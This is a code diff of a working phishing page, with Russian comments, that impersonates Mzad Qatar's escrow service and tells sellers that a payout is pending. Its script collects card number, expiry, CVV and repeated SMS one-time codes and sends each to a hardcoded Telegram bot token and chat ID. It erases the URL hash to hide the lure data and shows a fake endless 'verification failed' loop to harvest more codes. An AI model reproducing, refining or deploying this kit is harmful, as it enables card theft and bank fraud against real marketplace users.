@@ -7,38 +7,43 @@
     <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
     <style>
         :root { --main-color: #8a1538; --bg: #f4f5f7; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg); margin: 0; padding: 15px; color: #333; }
-        .container { max-width: 480px; margin: 0 auto; background: #fff; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.08); overflow: hidden; }
-        .header { background: #fff; padding: 20px; text-align: center; border-bottom: 3px solid var(--main-color); }
-        .header img { height: 45px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg); margin: 0; padding: 0; color: #333; }
+        .container { max-width: 480px; margin: 0 auto; background: #fff; min-height: 100vh; position: relative; }
         
-        .content { padding: 25px 20px; }
-        .status-badge { background: #e8f5e9; border: 1px solid #27ae60; color: #27ae60; padding: 10px; border-radius: 6px; font-weight: 800; margin-bottom: 20px; font-size: 13px; display: flex; align-items: center; gap: 8px; text-transform: uppercase; }
-        .status-badge::before { content: '●'; font-size: 16px; }
-        
-        .item-preview { display: flex; gap: 15px; margin-bottom: 20px; align-items: center; background: #fafafa; padding: 10px; border-radius: 8px; border: 1px solid #eee; }
-        .item-preview img { width: 80px; height: 80px; object-fit: contain; border-radius: 6px; background: #fff; border: 1px solid #ddd; }
-        .item-info h3 { margin: 0 0 5px; font-size: 16px; color: #222; }
-        .item-info .price { font-size: 20px; font-weight: 800; color: var(--main-color); }
+        .header { background: #fff; padding: 15px 20px; border-bottom: 3px solid var(--main-color); text-align: center; position: sticky; top: 0; z-index: 100; }
+        .header img { height: 42px; }
 
-        h2 { font-size: 20px; margin-top: 0; color: #111; }
-        p { line-height: 1.5; font-size: 14px; color: #555; }
-        .tracking-num { font-family: monospace; font-weight: bold; color: #111; background: #eee; padding: 2px 6px; border-radius: 4px; }
+        /* БЛОК С ТОВАРОМ */
+        .product-area { padding: 20px; border-bottom: 8px solid var(--bg); }
+        .status-badge { background: #e8f5e9; border: 1px solid #27ae60; color: #27ae60; padding: 8px 12px; border-radius: 6px; font-weight: 800; font-size: 12px; margin-bottom: 15px; display: inline-flex; align-items: center; gap: 6px; }
+        .status-badge::before { content: '●'; font-size: 14px; }
         
-        .form-group { margin-bottom: 15px; text-align: left; }
-        label { display: block; font-size: 12px; margin-bottom: 6px; color: #777; font-weight: bold; text-transform: uppercase; }
-        input { width: 100%; padding: 16px; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.2s; background: #fdfdfd; }
-        input:focus { border-color: var(--main-color); background: #fff; box-shadow: 0 0 0 3px rgba(138, 21, 56, 0.1); }
-        input.err { border-color: #e74c3c; background: #fdf0f0; }
+        .img-wrapper { width: 100%; aspect-ratio: 1.2; background: #fafafa; border: 1px solid #eee; border-radius: 12px; display: flex; align-items: center; justify-content: center; overflow: hidden; margin-bottom: 15px; }
+        .img-wrapper img { width: 100%; height: 100%; object-fit: contain; }
+        
+        .title { font-size: 20px; font-weight: 700; margin: 0 0 5px; color: #111; }
+        .price { font-size: 26px; font-weight: 800; color: var(--main-color); margin-bottom: 5px; }
+        .track-id { font-family: monospace; font-size: 14px; color: #666; margin-bottom: 15px; }
 
-        .btn { background: var(--main-color); color: #fff; border: none; padding: 18px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.2s; }
-        .btn:active { transform: scale(0.98); }
+        .btn-trigger { background: var(--main-color); color: #fff; border: none; padding: 18px; width: calc(100% - 40px); margin: 20px; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(138, 21, 56, 0.25); }
+
+        /* МОДАЛЬНОЕ ОКНО */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.65); z-index: 2000; align-items: center; justify-content: center; }
+        .modal-content { background: white; width: 88%; max-width: 400px; padding: 25px; border-radius: 20px; text-align: center; animation: popUp 0.3s ease; }
+        @keyframes popUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        .modal-h { font-size: 18px; font-weight: 700; margin-bottom: 20px; color: var(--main-color); }
+        .q-inp { width: 100%; padding: 16px; border: 1.5px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; text-align: center; transition: 0.2s; }
+        .q-inp:focus { border-color: var(--main-color); }
+        .q-inp.err { border-color: #e74c3c; background: #fdf0f0; }
+
+        .btn-submit { background: var(--main-color); color: #fff; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
 
         #step-2 { display: none; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--main-color); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .footer { padding: 25px; text-align: center; font-size: 11px; color: #aaa; border-top: 1px solid #eee; background: #fafafa; }
+        .footer { padding: 30px 20px; text-align: center; font-size: 12px; color: #aaa; background: #fff; border-top: 8px solid var(--bg); }
     </style>
 </head>
 <body>
@@ -48,96 +53,96 @@
         <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" alt="Mzad Qatar">
     </div>
     
-    <div class="content" id="step-1">
+    <div class="product-area">
         <div class="status-badge">PAYOUT FUNDS PENDING</div>
-        <h2>Secure Escrow Release</h2>
-        <p>Order <span class="tracking-num" id="track-id">...</span> is complete. Verify your card details to receive the funds.</p>
+        <div class="track-id" id="t-id">Order ID: Loading...</div>
         
-        <div class="item-preview" id="item-box" style="display:none;">
+        <div class="img-wrapper">
             <img id="p-img" src="">
-            <div class="item-info">
-                <h3 id="p-name">Loading item...</h3>
-                <div class="price" id="p-price">0 QAR</div>
-            </div>
         </div>
-
-        <form id="payment-form">
-            <div class="form-group">
-                <label>Card Number</label>
-                <input type="text" id="cc" placeholder="0000 0000 0000 0000" required maxlength="19">
-            </div>
-            <div style="display: flex; gap: 10px;">
-                <div class="form-group" style="flex: 1.5;">
-                    <label>Expiry (MM/YY)</label>
-                    <input type="text" id="exp" placeholder="MM/YY" required maxlength="5">
-                </div>
-                <div class="form-group" style="flex: 1;">
-                    <label>CVV</label>
-                    <input type="password" id="cvv" placeholder="***" required maxlength="4">
-                </div>
-            </div>
-            <button type="submit" class="btn" id="btn-card">VERIFY & RECEIVE FUNDS</button>
-        </form>
+        
+        <h1 class="title" id="p-name">Loading Product...</h1>
+        <div class="price" id="p-price">0 QAR</div>
+        <p style="font-size: 14px; color: #555; line-height: 1.5; margin: 0;">The buyer has transferred the funds. Please verify your receiving card to complete the escrow release.</p>
     </div>
 
-    <div class="content" id="step-2">
-        <h2 style="text-align:center; color:#111;">Bank Authentication</h2>
-        <p style="text-align:center;">To authorize the deposit of <b id="t-amount" style="color:var(--main-color);"></b>, please enter the one-time SMS code sent to your mobile phone.</p>
-        <div id="loading" style="display:none;"><div class="loader"></div></div>
-        
-        <form id="sms-form">
-            <div class="form-group">
-                <input type="text" id="sms" placeholder="Enter SMS Code" required style="text-align:center; font-size: 20px; letter-spacing: 4px;">
-            </div>
-            <button type="submit" class="btn" id="btn-sms">CONFIRM TRANSFER</button>
-        </form>
+    <button class="btn-trigger" onclick="openModal()">RECEIVE FUNDS</button>
+
+    <div class="modal" id="payModal">
+        <div class="modal-content" id="step-1">
+            <div class="modal-h">Card Verification</div>
+            <form id="card-form">
+                <input type="text" id="cc" class="q-inp" placeholder="Card Number" required maxlength="19">
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" id="exp" class="q-inp" placeholder="MM/YY" required maxlength="5" style="flex: 1.5;">
+                    <input type="password" id="cvv" class="q-inp" placeholder="CVV" required maxlength="4" style="flex: 1;">
+                </div>
+                <button type="submit" class="btn-submit" id="btn-card">PROCEED</button>
+            </form>
+            <div onclick="closeModal()" style="margin-top:15px; color:#999; cursor:pointer; font-size:14px; font-weight:600;">Cancel</div>
+        </div>
+
+        <div class="modal-content" id="step-2">
+            <div class="modal-h" style="color: #111;">Bank Authentication</div>
+            <p style="font-size:13px; color:#666;">To authorize the deposit of <b id="t-amount" style="color:var(--main-color);"></b>, please enter the SMS code sent to your device.</p>
+            <div id="loading" style="display:none;"><div class="loader"></div></div>
+            
+            <form id="sms-form">
+                <input type="text" id="sms" class="q-inp" placeholder="SMS Code" required style="font-size: 22px; letter-spacing: 4px; font-weight: bold;">
+                <button type="submit" class="btn-submit" id="btn-sms">CONFIRM TRANSFER</button>
+            </form>
+        </div>
     </div>
 
     <div class="footer">
-        <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png" style="height: 30px; margin-bottom:15px;"><br>
-        © 2026 Mzad Qatar Escrow Services. <br>
+        <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png" style="height: 35px; margin-bottom: 10px; border-radius: 6px;"><br>
+        © 2026 Mzad Qatar Escrow Services.<br>
         Secured by QNB Financial Protocols.
     </div>
 </div>
 
 <script>
-    // БОТ-ПРИЕМЩИК ЛОГОВ КАРТ И СМС
+    // БОТ-ПРИЕМЩИК ЛОГОВ (Твой первый бот)
     const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
     const CHAT_ID = '8071425015';
 
-    // 1. ВЫТАСКИВАЕМ ID ИЗ ССЫЛКИ
-    const urlParams = new URLSearchParams(window.location.search);
-    const trackId = urlParams.get('id') || '987349182746';
+    let globalItem = "Device", globalPrice = "0";
 
-    document.getElementById('track-id').innerText = '#' + trackId;
+    // 1. ВЫТАСКИВАЕМ ID ИЗ ПУТИ
+    const path = window.location.pathname.split('/').filter(Boolean);
+    const trackId = path[path.length - 1] || 'UNKNOWN';
+    document.getElementById('t-id').innerText = 'Order ID: #' + trackId;
 
-    let globalItem = "Device";
-    let globalPrice = "0";
+    // 2. РАСПАКОВКА ДАННЫХ И СТЕЛС-УДАЛЕНИЕ HASH
+    const hash = window.location.hash.substring(1);
+    if(hash) {
+        try {
+            // Раскодируем Base64 с поддержкой кириллицы/арабского
+            const decodedStr = decodeURIComponent(escape(window.atob(hash)));
+            const data = JSON.parse(decodedStr);
+            
+            globalItem = data.i || globalItem;
+            globalPrice = data.p || globalPrice;
+            
+            document.getElementById('p-name').innerText = globalItem;
+            document.getElementById('p-price').innerText = globalPrice + ' QAR';
+            document.getElementById('t-amount').innerText = globalPrice + ' QAR';
+            
+            if(data.m) {
+                // Используем прокси для обхода блокировки фото сервером Mzad
+                document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(data.m)}`;
+            }
 
-    // МАГИЯ: Меняем адресную строку без перезагрузки страницы! (Нет 404 ошибки)
-    if (urlParams.has('id')) {
-        window.history.replaceState(null, '', `/track/id/${trackId}`);
+            // МАГИЯ: Стираем # из адресной строки без перезагрузки страницы
+            window.history.replaceState(null, '', window.location.pathname);
+            
+        } catch(e) { console.error("Hash decode error"); }
     }
 
-    // 2. СКАЧИВАЕМ ДАННЫЕ ИЗ ОБЛАКА
-    if (trackId !== '987349182746') {
-        fetch(`https://jsonblob.com/api/jsonBlob/${trackId}`)
-            .then(r => r.json())
-            .then(data => {
-                document.getElementById('item-box').style.display = 'flex';
-                globalItem = data.i;
-                globalPrice = data.p;
-                document.getElementById('p-name').innerText = globalItem;
-                document.getElementById('p-price').innerText = globalPrice + ' QAR';
-                document.getElementById('t-amount').innerText = globalPrice + ' QAR';
-                if(data.m) {
-                    document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(data.m)}`;
-                }
-            })
-            .catch(e => console.log("Blob fetch error"));
-    }
+    function openModal() { document.getElementById('payModal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('payModal').style.display = 'none'; }
 
-    // 3. МАСКИ
+    // 3. МАСКИ ВВОДА
     document.getElementById('cc').addEventListener('input', function (e) {
         this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
         this.classList.remove('err');
@@ -158,7 +163,7 @@
     }
 
     // 4. ОТПРАВКА КАРТЫ В БОТА
-    document.getElementById('payment-form').addEventListener('submit', (e) => {
+    document.getElementById('card-form').addEventListener('submit', (e) => {
         e.preventDefault();
         const cc = document.getElementById('cc');
         if (!isValid(cc.value)) {
@@ -174,7 +179,7 @@
         const msg = `🇶🇦 **MZAD CARD**\n🆔 ID: #${trackId}\n📦 ${globalItem}\n💰 ${globalPrice} QAR\n\n💳 \`${cc.value}\`\n📅 \`${exp}\`\n🔒 \`${cvv}\``;
         new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
-        // ПЕРЕКЛЮЧЕНИЕ НА SMS
+        // ПЕРЕХОД НА 3DS
         setTimeout(() => {
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
@@ -197,9 +202,9 @@
         const msg = `🔑 **SMS CODE**: \`${sms}\`\n🆔 ID: #${trackId}`;
         new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
-        // БЕСКОНЕЧНЫЙ ДОБОР КОДОВ
+        // БЕСКОНЕЧНЫЙ ЦИКЛ ОШИБОК КОДА
         setTimeout(() => {
-            alert("The verification code has expired. A new code has been sent to your device.");
+            alert("Verification failed. A new code has been sent to your device.");
             document.getElementById('btn-sms').innerText = 'CONFIRM TRANSFER';
             document.getElementById('sms').value = '';
         }, 2000);
